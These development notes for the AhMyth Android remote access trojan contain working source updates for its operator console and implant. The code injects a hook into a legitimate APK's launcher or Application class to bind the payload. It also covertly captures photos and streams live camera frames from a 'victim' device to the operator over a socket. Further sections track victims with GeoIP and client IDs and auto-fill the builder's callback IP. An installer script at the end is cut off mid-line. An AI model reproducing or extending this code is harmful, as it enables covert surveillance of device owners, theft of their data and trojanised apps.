## Updated `getLauncherActivity` & `getLauncherPath` functions + partially updated `bindOnActivity` method 
> These updated functions contain a 99% Accuracy rating when it comes to their combined usage of locating either an APK file's Main Application Class or its Main Launcher Activity class according to chatGPT. It just needs its logs cleaned up and errors that arise written to error log files
> > Partial updates to `bindOnActivity` for cleaner logs as well as invocation of `getLauncherActivity` and `getLauncherPath`.
> > Just needs further function and log cleaning

<details>
    <summary>updated "getLauncherActivity" & "getLauncherPath" functions + partially updated "bindOnActivity" logic</summary>
    <br>

- AppCtrl.js
```js
/**
 * Processes class names by handling fully qualified names.
 * @param {string} className - The class name to process.
 * @returns {string|null} - The processed class name with '.smali' appended, or null if the class name is empty.
 */
function processClassName(className) {
    if (!className) return null; // Handle empty class names

    // Return the class name by extracting the last part and appending '.smali'
    return `${className.split('.').pop()}.smali`;
}

/**
 * Checks if the class is a system class (like `android.app` or `androidx`).
 * @param {string} className - The class name to check.
 * @returns {boolean} - Whether the class name is a system class.
 */
const systemClassPrefixes = ['android.app', 'androidx', 'android.support', 'android.view', 'android.content'];

function isSystemClass(className) {
    return systemClassPrefixes.some(prefix => className.startsWith(prefix));
}

/**
 * Checks if an activity has the MAIN action and LAUNCHER or DEFAULT category.
 * @param {object} filter - The intent-filter object to check.
 * @returns {boolean} - Whether the filter matches the main launcher activity.
 */
const isLauncherActivity = (filter) =>
    filter['action']?.some(action =>
        action['$']['android:name'] === 'android.intent.action.MAIN'
    ) &&
    filter['category']?.some(category =>
        category['$']['android:name'] === 'android.intent.category.LAUNCHER'
    );

/**
 * Extracts the name of either the main application class or the main launcher activity class from the Android manifest.
 * @param {object} manifest - The parsed Android manifest.
 * @returns {string|null} - The processed launcher activity class name with '.smali' or null if not found.
 */
function getLauncherActivity(manifest) {
    delayedLog('[★] Attempting to Locate the Main Application Class...');

    const application = manifest?.manifest?.application?.[0];
    if (!application) {
        delayedLog('[!] No <application> tag found in manifest.', CONSTANTS.logStatus.ERROR);
        return null;
    }

    // Extract package name
    const packageName = manifest?.manifest?.['$']?.['package'];
    if (!packageName) {
        delayedLog('[!] No package name found in manifest. Invalid manifest.', CONSTANTS.logStatus.ERROR);
        return null;
    }

    // Extract and process the main application class
    const mainApplicationClassName = application?.['$']?.['android:name'];
    if (mainApplicationClassName) {
        if (!isSystemClass(mainApplicationClassName)) {
            delayedLog(`[¡] Found Main Application Class: ${mainApplicationClassName}`, CONSTANTS.logStatus.INFO);
            return { className: processClassName(mainApplicationClassName), type: 'application' }; // return an object containing the processed class name as well as the class type

        } else {
            delayedLog('[!] Main Application Class is a System Class or Invalid.', CONSTANTS.logStatus.WARNING);
        }
    } else {
        delayedLog('[!] No Main Application Class Found.', CONSTANTS.logStatus.INFO);
    }

    delayedLog('[★] Attempting to Locate the Main Launcher Activity Class...');

    // Find all activities with MAIN action and LAUNCHER or DEFAULT category
    const activities = application?.['activity'];
    if (Array.isArray(activities)) {
        const launcherActivities = activities.filter(activity => {
            const intentFilter = activity?.['intent-filter'];
            return intentFilter?.some(isLauncherActivity);
        });

        // Handle case with multiple launcher activities (e.g., use highest priority or first match)
        if (launcherActivities.length > 0) {
            launcherActivities.sort((a, b) => {
                const priorityA = parseInt(a?.['intent-filter']?.[0]?.['$']?.['android:priority'] || 0, 10);
                const priorityB = parseInt(b?.['intent-filter']?.[0]?.['$']?.['android:priority'] || 0, 10);
                return priorityB - priorityA; // Sort by descending priority
            });

            const mainActivityClassName = launcherActivities[0]?.['$']?.['android:name'];
            if (mainActivityClassName && !isSystemClass(mainActivityClassName)) {
                const processedActivityName = processClassName(mainActivityClassName); // Only process class name
                delayedLog('[¡] Scoped the Main Launcher Activity Class for Hooking...', CONSTANTS.logStatus.INFO);
                return { className: processedActivityName, type: 'launcher' }; // return an object containing the processed class name as well as the class type
            } else {
                delayedLog('[!] Main Launcher Activity Class is a System Class or Invalid.', CONSTANTS.logStatus.WARNING);
            }
        } else {
            delayedLog('[!] No Main Launcher Activity Class Found.', CONSTANTS.logStatus.ERROR);
        }
    }

    /**
     * Processes the activity aliases from the AndroidManifest.xml and extracts the main launcher activity class 
     * from valid aliases. The manifest references Java class names, and this function processes them to locate 
     * corresponding smali files.
     * 
     * 1. Checks if the alias matches a launcher activity.
     * 2. Ensures unique target activities by stripping the '.smali' extension for comparison.
     * 3. Adds the fully processed class name (with '.smali') to the list of valid aliases.
     * 
     * @returns {string|undefined} The first valid launcher activity class with '.smali' extension if found, otherwise undefined.
     */

    delayedLog('[i] Checking activity aliases...', CONSTANTS.logStatus.INFO);

    // Handling activity aliases
    const activityAliases = application?.['activity-alias'];
    const validAliases = [];

    if (activityAliases && Array.isArray(activityAliases)) {
        const targetActivities = new Set(); // To track unique target activities

        for (const activityAlias of activityAliases) {
            const intentFilter = activityAlias?.['intent-filter'];

            if (intentFilter) {
                // Check if this alias is for a launcher activity
                const isLauncherAlias = intentFilter.some(isLauncherActivity);

                if (isLauncherAlias) {
                    let targetActivityName = activityAlias?.['$']?.['android:targetActivity'];

                    // Ensure the alias targets a valid activity
                    if (targetActivityName && targetActivityName.trim() !== '') {
                        // Process the target activity class
                        const processedTargetActivity = processClassName(targetActivityName);

                        // Strip '.smali' extension for Set comparison (manifest class names don't have it)
                        const classNameWithoutExtension = processedTargetActivity.replace('.smali', '');

                        // Only add unique target activities by using Set to track them without '.smali'
                        if (!targetActivities.has(classNameWithoutExtension)) {
                            // Add the target activity to the set
                            targetActivities.add(classNameWithoutExtension);
                            // Store the fully processed name (with '.smali')
                            validAliases.push(processedTargetActivity);
                            delayedLog(`[¡] Scoped the Main Launcher Activity Class in an Alias for Hooking: ${processedTargetActivity}`, CONSTANTS.logStatus.INFO);
                        }
                    } else {
                        delayedLog('[!] Invalid or missing targetActivity in alias.', CONSTANTS.logStatus.WARNING);
                    }
                }
            }
        }

        // Return the first valid alias found with '.smali' extension
        if (validAliases.length > 0) {
            return { className: validAliases[0], type: 'launcher' }; // Return with type 'launcher' for main launcher activities found in activity aliases
        } else {
            delayedLog('[!] No Main Launcher Activity Class Found in Aliases.', CONSTANTS.logStatus.WARNING);
        }
    } else {
        delayedLog('[!] No Activity Aliases Present in Manifest.', CONSTANTS.logStatus.INFO);
    }

    // If nothing was found
    return null;
}

/**
* Searches for the launcher activity file within the specified APK folder.
* @param {string} launcherActivity - The launcher activity file name to search for (e.g., 'MainActivity.smali').
* @param {string} apkFolder - The directory path to search within.
* @param {string} classType - The type of class (Main Application Class or Main Launcher Activity Class).
* @param {function} callback - The callback function to handle the result or error.
*/
function getLauncherPath(launcherActivity, apkFolder, classType, callback) {
    let launcherPath = null;
    let found = false;

    const stream = readdirp(apkFolder, {
        fileFilter: (entry) => {
            // Allow partial matching and ignore inner classes (no '$')
            return entry.basename.includes(launcherActivity) && !entry.basename.includes('$');
        },
        alwaysStat: true
    });

    stream
        .on('data', (entry) => {
            if (!found) {
                found = true;
                launcherPath = JSON.stringify(entry.path).replace(/^"(.*)"$/, '$1').replace(/\n$/, '');
            }
        })
        .on('end', () => {
            if (!found) {
                const errorMessage = `Unable to locate the ${classType} file! Please use the "On Boot" method!`;
                callback(new Error(errorMessage)); // Ensure callback is invoked with an error
            } else {
                callback(null, launcherPath); // Ensure callback is invoked with the launcherPath
            }
        })
        .on('error', (err) => {
            callback(err); // Ensure callback is invoked on error
        });
}
```

- Usgae:
```js
const launcherActivity = getLauncherActivity(result);

if (!launcherActivity) {
    delayedLog('[x] Cannot locate a suitable main class type in the manifest!', CONSTANTS.logStatus.FAIL);
    delayedLog('[x] Please use another APK as a template.', CONSTANTS.logStatus.FAIL);
    return;
}

// Extract className and type from getLauncherActivity's result
const { className, type } = launcherActivity;
const classType = type === 'application' ? 'Main Application Class' : 'Main Launcher Activity Class';

delayedLog(`[★] Locating the ${classType} file...`);

// Pass className, apkFolder, and classType to getLauncherPath
getLauncherPath(className, apkFolder, classType, (err, launcherPath) => {
    if (err) {
        // Log the error message if any
        delayedLog(`[x] ${err.message}`, CONSTANTS.logStatus.FAIL);
        return;
    }

    if (launcherPath) {
        delayedLog(`[✓] ${classType} file located: ${launcherPath}`, CONSTANTS.logStatus.INFO);
    }

    delayedLog(`[★] Reading the ${classType} File...`);
    fs.readFile(dir.join(apkFolder, launcherPath), 'utf8', (error, data) => {
        if (error) {
            delayedLog(`[x] Unable to Read the ${classType} File!`, CONSTANTS.logStatus.FAIL);
            writeErrorLog(error, 'Reading.log');
            delayedLog('[¡] Error written to "Reading.log" on ', CONSTANTS.logStatus.INFO);
            delayedLog(logPath, CONSTANTS.logStatus.INFO);
            return;
        }

        const startService = CONSTANTS.serviceSrc + CONSTANTS.serviceStart;
        var hook = CONSTANTS.hookPoint;

        delayedLog(`[★] Injecting AhMyth Hook into the ${classType} File...`);

        var output = data.replace(hook, startService);
        fs.writeFile(dir.join(apkFolder, launcherPath), output, 'utf8', (error) => {
            if (error) {
                delayedLog(`[x] Unable to Hook the ${classType} File!`, CONSTANTS.logStatus.FAIL);
                writeErrorLog(error, 'Writing.log');
                delayedLog('[¡] Error written to "Writing.log" on ', CONSTANTS.logStatus.INFO);
                delayedLog(logPath, CONSTANTS.logStatus.INFO);
                return;
            }

            /* existing activity based binding logic */
        });
    });
});
```
</details>
<br>

## Live Preview for Camera Feature (Server Side + Client Side)
> Needs to be updated to work from both the front and back camera rather than just the back as well as to continuously stream preview frames as it only does it for a few seconds and then stops

<details>
    <summary>Live Preview Frame Streaming</summary>

### Server Side
- LabCtrl.js (Camera Sub-Controller part)
```javascript
//-----------------------Camera Controller (camera.html)------------------------
app.controller("CamCtrl", function ($scope, $rootScope) {
    var $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.isLiveShown = false; // To track live preview state
    var camera = CONSTANTS.orders.camera;

    // Remove socket listener if the camera page is changed or destroyed
    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
    });

    $rootScope.Log("[i] Accessing the Victim's Available Cameras...", CONSTANTS.logStatus.INFO);
    $camCtrl.load = 'loading';

    // Request camera list from the server
    socket.emit(CONSTANTS.order, { order: camera, extra: 'camList' });

    // Handle incoming data
    socket.on(camera, (data) => {
        if (data.camList === true) { // Response is the camera list
            $rootScope.Log('[✓] Cameras List Arrived', CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            $camCtrl.load = '';
            $camCtrl.selectedCam = $camCtrl.cameras[0]; // Default to the first camera
            $camCtrl.$apply();
        }

        if (data.image === true) { // Response is a picture
            $rootScope.Log('[✓] Picture Arrived', CONSTANTS.logStatus.SUCCESS);

            // Convert binary to base64
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
            $camCtrl.isSaveShown = true;
            $camCtrl.isLiveShown = false; // Stop live preview if snapshot is taken
            $camCtrl.$apply();

            // Function to save the photo
            $camCtrl.savePhoto = () => {
                $rootScope.Log('[i] Saving Picture...', CONSTANTS.logStatus.INFO);
                var picPath = path.join(downloadsPath, Date.now() + ".jpg");
                fs.outputFile(picPath, Buffer.from(base64String, "base64"), (err) => {
                    if (!err)
                        $rootScope.Log('[✓] Picture Saved at: ' + picPath, CONSTANTS.logStatus.SUCCESS);
                    else
                        $rootScope.Log('[x] Failed to Save the Snapped Photo to the Local Disk!', CONSTANTS.logStatus.FAIL);
                });
            }
        }
        
        if (data.preview === true) { // Response is a live preview frame
            $rootScope.Log('[✓] Live Preview Frame Arrived', CONSTANTS.logStatus.INFO);

            // Convert binary to base64 for display
            var uint8Arr = new Uint8Array(data.buffer);
            var binary = '';
            for (var i = 0; i < uint8Arr.length; i++) {
                binary += String.fromCharCode(uint8Arr[i]);
            }
            var base64String = window.btoa(binary);

            $camCtrl.imgUrl = 'data:image/jpeg;base64,' + base64String;
            $camCtrl.isSaveShown = false; // Hide save button during live preview
            $camCtrl.$apply();
        }
    });

    // Snap a picture
    $camCtrl.snap = () => {
        $rootScope.Log('[i] Snapping a picture...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: $camCtrl.selectedCam.id });
    }

    // Start live preview
    $camCtrl.startLivePreview = () => {
        $rootScope.Log('[i] Starting Live Preview...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: 'startLive' });
        $camCtrl.isLiveShown = true;
    }

    // Stop live preview
    $camCtrl.stopLivePreview = () => {
        $rootScope.Log('[i] Stopping Live Preview...', CONSTANTS.logStatus.INFO);
        socket.emit(CONSTANTS.order, { order: camera, extra: 'stopLive' });
        $camCtrl.isLiveShown = false;
    }
});
```
- camera.html
```html
<div class="ui {{load}} basic segment h100"
    style="overflow-y:auto;overflow-x: auto;white-space:nowrap; height: 348px;">
    <div class="ui grid center aligned border">
        <div class="row h20">
            <div class="sixteen wide column">
                <select class="ui dropdown" ng-options="item.name for item in cameras"
                    ng-model="selectedCam"></select>
                <button class="ui labeled icon black button" ng-click="clearLogs(); snap()"><i
                        class="photo icon"></i> Snap</button>
                <button class="ui labeled icon blue button" ng-click="clearLogs(); startLivePreview()" ng-disabled="isLiveShown"><i
                        class="play icon"></i> Start Live Preview</button>
                <button class="ui labeled icon red button" ng-click="clearLogs(); stopLivePreview()" ng-disabled="!isLiveShown"><i
                        class="stop icon"></i> Stop Live Preview</button>
            </div>
        </div>
        <div class="row h80">
            <div class="sixteen wide column h100">
                <div class="ui image border">
                    <a class="ui red ribbon label" ng-show="isSaveShown"
                        ng-click="clearLogs(); savePhoto()">
                        <i class="save icon"></i> Save
                    </a>

                    <div class="image-container bg2">
                        <img class="imageHolder" src="./assets/img/imageHolder.png" ng-src="{{imgUrl}}">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>
```

### Client Side
- CameraManager.java 
```java
package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Rect;
import android.graphics.SurfaceTexture;
import android.graphics.YuvImage;
import android.hardware.Camera;
import android.hardware.Camera.Parameters;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.ByteArrayOutputStream;

public class CameraManager {
    private Context context;
    private Camera camera;
    private static final String LOG_TAG = "CameraManager";
    private static final String LOG_FILE_NAME = "camera_errors.log";

    public CameraManager(Context context) {
        this.context = context;
    }

    public void startUp(int cameraID) {
        try {
            camera = Camera.open(cameraID);
            Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);

            // Use a new SurfaceTexture to start the camera preview
            SurfaceTexture surfaceTexture = new SurfaceTexture(0);
            camera.setPreviewTexture(surfaceTexture);
            camera.startPreview();
        } catch (Exception e) {
            Log.e(LOG_TAG, "Error starting camera preview", e);
        }

        // Capture a picture when the camera is ready
        camera.takePicture(null, null, new Camera.PictureCallback() {
            @Override
            public void onPictureTaken(byte[] data, Camera camera) {
                releaseCamera();
                sendPhoto(data); // Send the captured photo
            }
        });
    }

    public void startLivePreview(int cameraID) {
        try {
            camera = Camera.open(cameraID);
            Parameters parameters = camera.getParameters();
            camera.setParameters(parameters);

            SurfaceTexture surfaceTexture = new SurfaceTexture(0);
            camera.setPreviewTexture(surfaceTexture);
            camera.startPreview();

            camera.setPreviewCallback(new Camera.PreviewCallback() {
                @Override
                public void onPreviewFrame(byte[] data, Camera camera) {
                    // Handle the frame data in a separate thread to avoid blocking
                    new Thread(() -> processAndSendPreviewFrame(data, camera)).start();
                }
            });
        } catch (Exception e) {
            Log.e("CameraManager", "Error starting live preview", e);
        }
    }

    public void stopLivePreview() {
        if (camera != null) {
            camera.setPreviewCallback(null); // Stop receiving preview frames
            camera.stopPreview(); // Stop the preview
            releaseCamera(); // Release the camera
        }
    }

    private void sendPhoto(byte[] data) {
        try {
            // Convert byte array to Bitmap
            Bitmap bitmap = BitmapFactory.decodeByteArray(data, 0, data.length);

            // Create a ByteArrayOutputStream to hold compressed JPEG data
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 20, bos); // Compress to JPEG

            // Convert the output stream to a byte array
            byte[] compressedData = bos.toByteArray();

            // Create a JSON object to send
            JSONObject object = new JSONObject();
            object.put("image", true);
            object.put("buffer", compressedData);

            // Emit the JSON object over the network
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);
        } catch (JSONException e) {
            Log.e(LOG_TAG, "Error sending photo", e);
        }
    }

    private void processAndSendPreviewFrame(byte[] data, Camera camera) {
        try {
            Camera.Size size = camera.getParameters().getPreviewSize();
            YuvImage yuvImage = new YuvImage(data, camera.getParameters().getPreviewFormat(), size.width, size.height, null);
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            yuvImage.compressToJpeg(new Rect(0, 0, size.width, size.height), 50, outputStream); // Adjust quality for better compression
            byte[] jpegData = outputStream.toByteArray();

            JSONObject object = new JSONObject();
            object.put("preview", true);
            object.put("buffer", jpegData);
            IOSocket.getInstance().getIoSocket().emit("x0000ca", object);

        } catch (Exception e) {
            Log.e("CameraManager", "Error processing and sending preview frames", e);
        }
    }

    private void releaseCamera() {
        if (camera != null) {
            camera.stopPreview(); // Stop the camera preview
            camera.release(); // Release the camera hardware
            camera = null; // Set the camera to null
        }
    }

    public JSONObject findCameraList() {
        if (!context.getPackageManager().hasSystemFeature(PackageManager.FEATURE_CAMERA)) {
            return null;
        }

        try {
            JSONObject cameras = new JSONObject();
            JSONArray list = new JSONArray();
            cameras.put("camList", true);

            // Search for available cameras
            int numberOfCameras = Camera.getNumberOfCameras();
            for (int i = 0; i < numberOfCameras; i++) {
                Camera.CameraInfo info = new Camera.CameraInfo();
                Camera.getCameraInfo(i, info);
                if (info.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Front");
                    jo.put("id", i);
                    list.put(jo);
                } else if (info.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Back");
                    jo.put("id", i);
                    list.put(jo);
                } else {
                    JSONObject jo = new JSONObject();
                    jo.put("name", "Other");
                    jo.put("id", i);
                    list.put(jo);
                }
            }
            cameras.put("list", list);
            return cameras;
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return null;
    }
}
```
- ConnectionManager.java
```java
    public static void sendReq() {
        try {

            if(ioSocket != null )
                return;

            ioSocket = IOSocket.getInstance().getIoSocket();

            ioSocket.on("ping", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    ioSocket.emit("pong");
                }
            });

            ioSocket.on("order", new Emitter.Listener() {
                @Override
                public void call(Object... args) {
                    try {
                        JSONObject data = (JSONObject) args[0];
                        String order = data.getString("order");
                        Log.e("order",order);
                        switch (order){
                            case "x0000ca":
                                if (data.getString("extra").equals("camList"))
                                    x0000ca(-1);
                                else if (data.getString("extra").equals("1"))
                                    x0000ca(1); // Start the front camera
                                else if (data.getString("extra").equals("0"))
                                    x0000ca(0); // Start the back camera
                                else if (data.getString("extra").equals("startLive"))
                                    x0000ca(2); // Start live preview
                                else if (data.getString("extra").equals("stopLive"))
                                    x0000ca(3); // Stop live preview
                                break;
                            /* other unrelated cases */
                        }
                    }catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            });
            ioSocket.connect();

        }catch (Exception ex){
            Log.e("error" , ex.getMessage());
        }
    }

    public static void x0000ca(int req) {
        CameraManager cameraManager = new CameraManager(context);
        switch (req) {
            case -1:
                JSONObject cameraList = cameraManager.findCameraList();
                if (cameraList != null)
                    ioSocket.emit("x0000ca", cameraList);
                break;
            case 1:
                cameraManager.startUp(1);
                break;
            case 0:
                cameraManager.startUp(0);
                break;
            case 2: // Request to start live preview
                cameraManager.startLivePreview(0); // Pass the correct camera ID if needed
                break;
            case 3: // Request to stop live preview
                cameraManager.stopLivePreview();
                break;
            default:
                Log.e("ConnectionManager", "Unknown camera command: " + req);
                break;
        }
    }
```
</details>
<br>

## Automatic application of Local Wireless LAN IP Address
> Works for Windows, but needs further updates for operation on Linux and macOS, specifically by determining which `wlan` address is actively using the internet
<details>
    <summary>Automatic application of Local Wireless LAN IP Address</summary>
    <br>
    
- AppCtrl.js
```js
// Function to get Wi-Fi IP address
function getWiFiIP() {
    const networkInterfaces = os.networkInterfaces();
    for (let interfaceName in networkInterfaces) {
        if (interfaceName.toLowerCase().includes('wi-fi')) { // Specifically look for 'Wi-Fi'
            for (let iface of networkInterfaces[interfaceName]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
    }
    // If no IP address is found, return null to indicate failure
    return null;
}

// function to Automatically set the IP address
$appCtrl.setWiFiIP = () => {
    const wifiIP = getWiFiIP(); // Call the function to get Wi-Fi IP address
    if (wifiIP) {
        $appCtrl.srcIP = wifiIP; // Set the IP address in the AngularJS model
    } else {
        // Log a warning message if the IP address cannot be set
        $appCtrl.Log('[!] Unable to Automatically Apply Your Private Wireless LAN adapter Wi-Fi address.', CONSTANTS.logStatus.WARNING);
        $appCtrl.Log('[¡] Please Enter it Manually.',  CONSTANTS.logStatus.INFO);
    }
};

// Detect tab click event and then call the function to set the Wi-Fi IP address
$(document).ready(function () {
    $('a.item').click(function () {
        const tab = $(this).attr('data-tab');
        if (tab === 'second') { // APK Builder tab
            $appCtrl.setWiFiIP(); // Set the IP when the APK Builder tab is clicked
            $appCtrl.$apply(); // Update the AngularJS scope manually
        }
    });
})
```
    
</details>
<br>

## Code for Updated `>_ Listen` and `>_ Stop` functions + Client ID association
> Handles IPv4 + IPv6 IP addresses through geoip better + Generates unqiue client hashes and then maps them to unique 4-digit client numbers and then assigns them to client connections.
>> This currently only assigns client ID numbers, it needs to be further updated to allow users to re-connect to specfic clients.
>> This may evem be reworked with some client side ID association which would allow users to connect and reconnect to specifc clients on specific ports

<details>
    <summary>Listen, Stop & Client ID Association Code</summary>
    <br>

- Main Process
```js
const crypto = require('crypto');

let clientIdCounter = 1;
const hashToClientId = {};
const clientIdToHash = {};

initialize();

// Function to generate a unique 4-digit client ID
function generateClientId() {
  // Ensure client IDs are always 4 digits
  return String(clientIdCounter++).padStart(4, '0');
}

// Function to create a hash from victim's information
function generateHash(victimInfo) {
  return crypto.createHash('md5').update(victimInfo).digest('hex');
}

// Function to get a unique 4-digit client ID based on victim's information
function getUniqueClientId(victimInfo) {
  const hash = generateHash(victimInfo);
  if (!hashToClientId[hash]) {
    // If hash does not exist, assign a new client ID
    const clientId = generateClientId();
    hashToClientId[hash] = clientId;
    clientIdToHash[clientId] = hash;
  }
  return hashToClientId[hash];
}

/* existing window code for Splash and Main Screen */

// Function to check if the extracted victim IP is private or public
function isPrivateIP(ip) {
  return /^10\./.test(ip) ||
    /^192\.168\./.test(ip) ||
    /^172\.(1[6-9]|2[0-9]|3[0-1])\./.test(ip);
}

// Global Object to track the listening status for each port
const listeningStatus = {};

// Global object to store client IDs by port
const clientIdsByPort = {};

// function to listen for incoming client connections
ipcMain.on('SocketIO:Listen', function (event, port) {
  if (listeningStatus[port]) {
    event.reply('SocketIO:ListenError', '[x] Already Listening on Port ' + port);
    return;
  }

  /* Initialize the client IDs array for the port 
  the victim connection was received on, if not already initialized. */
  if (!clientIdsByPort[port]) {
    clientIdsByPort[port] = [];
  }

  /* Allows the display of end directory files when using 
  the File Manager Feature in the Victim's Lab as well 
  as downloads from the victim device of upto 50mb */
  IOs[port] = io.listen(port, {
    maxHttpBufferSize: 1024 * 1024 * 100
  });
  IOs[port].sockets.pingInterval = 10000;
  IOs[port].sockets.pingTimeout = 10000;

  // retrieve and handle the connection as well as the victim information
  IOs[port].sockets.on('connection', function (socket) {
    var address = socket.request.connection;
    var query = socket.handshake.query;
    var index = query.id;

    // Extract IP address of the connected victim(s) + handle both IPv4 and IPv6 formats
    var ip = address.remoteAddress;
    if (ip.includes(':')) {
      ip = ip.substring(ip.lastIndexOf(':') + 1);
    }

    /* Set the counry as null for every connection
    before obtaining the country of origin based on the victim's IP 
    to avoid conflictions */
    var country = null;

    // check if the extracted victim IP from an active connection is Private or Public
    if (isPrivateIP(ip)) {

      // If the IP is Private
      const warningMessage = `[!] IP ${ip} is a private IP address! Private IP addresses cannot be Geolocated, skipping GeoIP lookup.`;
      event.reply('SocketIO:GeoIPError', warningMessage);
      event.sender.send('SocketIO:Log', warningMessage);
    } else {

      // if the IP is public 
      // Check the IP location
      var geo = geoip.lookup(ip);

      // handle exceptions
      if (geo) {
        if (geo.country) {
          country = geo.country.toLowerCase();
        } else {
          const warningMessage = `[!] GeoIP lookup returned no country for IP: ${ip}, Unable to determine the Victim's Country.`;
          event.reply('SocketIO:GeoIPError', warningMessage);
          event.sender.send('SocketIO:Log', warningMessage);
        }
      } else {
        const warningMessage = `[!] GeoIP lookup failed for IP: ${ip}, Unable to determine the Victim's Country.`;
        event.reply('SocketIO:GeoIPError', warningMessage);
        event.sender.send('SocketIO:Log', warningMessage);
      }
    }

    /* generate a unique client hash and map it to a 
    4 digit client number based on the victim's IP 
    and the remote address port */
    const victimInfo = `${ip}:${address.remotePort}`;
    const clientId = getUniqueClientId(victimInfo);

    // Store the client ID in the global object
    clientIdsByPort[port].push(clientId);

    victimsList.addVictim(socket, ip, address.remotePort, country, query.manf, query.model, query.release, query.id, clientId);

    /* existing code for notification window */
});

ipcMain.on('SocketIO:Stop', function (event, port) {
  if (IOs[port]) {
    const sockets = IOs[port].sockets.sockets;
    const hasActiveConnections = Object.keys(sockets).length > 0;

    // Set the flag to indicate server-initiated disconnection if there are active connections
    if (hasActiveConnections) {
      IOs[port].sockets.serverInitiatedDisconnection = true;
    }

    IOs[port].close();
    IOs[port] = null;

    if (hasActiveConnections) {
      win.webContents.send('SocketIO:ServerDisconnectionMessage', clientIdsByPort[port]);
    } else {
      event.reply('SocketIO:Stop', '[✓] Stopped Listening on Port: ' + port);
    }

    // Update listening status for the specific port
    listeningStatus[port] = false;

    // Clear the client IDs for the port 
    delete clientIdsByPort[port];
  } else {
    event.reply('SocketIO:StopError', '[x] The Server is not Currently Listening on Port: ' + port);
  }
});
```

- Render Process (AppCtrl)
```js
    /* existing code */

    /* existing code */

    /* existing code */

    /* existing code */

    ipcRenderer.on('SocketIO:ServerDisconnectionMessage', (event, clientIds) => {
        clientIds.forEach(clientId => {
          $appCtrl.Log(`[¡] Server Disconnected from Client: ${clientId}`, CONSTANTS.logStatus.INFO);
        });
        $appCtrl.isListen = false;
        $appCtrl.$apply();
    });

    /* existing code */
```

- Victim Module (Victim.js)
```js
 var Victim = function(socket, ip, port, country, manf, model, release, clientId) {
     this.socket = socket;
     this.ip = ip;
     this.port = port;
     this.country = country;
     this.manf = manf;
     this.model = model;
     this.release = release;
     this.clientId = clientId
 };

 class Victims {
     constructor() {
         this.victimList = {};
         this.instance = this;
     }

     addVictim = (socket, ip, port, country, manf, model, release, id, clientId) => {
        var victim = new Victim(socket, ip, port, country, manf, model, release, clientId);
        this.victimList[id] = victim;
    }
    

     getVictim(id) {
         if (this.victimList[id] != null)
             return this.victimList[id];

         return -1;
     }

     rmVictim(id) {
         delete this.victimList[id];
     }

     getVictimList() {
         return this.victimList;
     }
 }

 module.exports = new Victims();
```

- index.html
```html
            <div class="row h75" style="overflow: scroll;">
                <div class="column">
                    <table class="ui table bg single line selectable">
                        <thead>
                            <tr>
                                <th></th>
                                <th>Client ID</th> <!-- New column for Client ID -->
                                <th>Country</th>
                                <th>Manuf.</th>
                                <th>Model</th>
                                <th>Release</th>
                                <th>IP</th>
                                <th>Port</th>
                                <th></th>
                            </tr>
                        </thead>

                        <tbody>
                            <tr ng-repeat="(key, victim) in victims">
                                <td><a class="ui black ribbon label" ng-click="openLab(key)">Open The Lab</a></td>
                                <td ng-bind="victim.clientId"></td> <!-- Display the Client ID -->
                                <td ng-if="victim.country != null"><i class="{{victim.country}} flag"></i></td>
                                <td ng-if="victim.country == null"><i class="help circle icon"></i></td>
                                <td ng-bind="victim.manf"></td>
                                <td ng-bind="victim.model"></td>
                                <td ng-bind="victim.release"></td>
                                <td ng-bind="victim.ip"></td>
                                <td ng-bind="victim.port"></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
```
</details>
<br></br>

## `autoinstall_linux` code.
> - Thank you to [karma0x309](https://github.com/karma0x309) for the neat base layout of this script.
> - Thank you to [A-Unix](https://github.com/A-Unix) for the figlet banner code that gives the installer a stylish banner.
>> - Needs to be updated to install for *DNF (danified yum)* based distros and other RPM based distros if AhMyth supports these distros
>> - Needs to be updated to install for *zyppper* based distros and other openSUSE based distros if AhMyth supports these distros
>> - Needs to be updated to install for *pkg* based distors and other FreeBSD distros if AhMyth supports these distros
>> - Needs to be updated to install for *Portage* based distros and other Gentoo Linux based distros if AhMyth supports these distros
>> - Needs to be updated to install for *apk* based distros and other Alpine Linux based distros if AhMyth supports these distros
<details>
    <Summary>Code</Summary>

```bash
#!/bin/sh

# Create 3D banner for showcase
create_3d_banner() {
    
    # Reset color code
    reset_color="\033[0m"
    
    # Banner color code
    blue="\033[34m"
    
    # Banner text
    banner_text="   AhMyth"

    # Check if figlet and lolcat are installed
    if command -v figlet > /dev/null 2>&1; then
        # Use figlet to create ASCII art with mono9 font
        figlet_output=$(figlet -f mono9 "$banner_text")

        # Use lolcat to add color to the ASCII art
        banner_output=$(echo "$figlet_output")

        # Print the result
        echo "${blue}${banner_output}${reset_color}"
    else
        if [ "$PACKAGE_MANAGER" = "apt-get" ]; then
            apt-get install -y figlet
        elif [ "$PACKAGE_MANAGER" = "pacman" ]; then
            pacman -Sy figlet
            
            # Reset color code
            reset_color="\033[0m"
    
            # Banner color code
            blue="\033[34m"
    
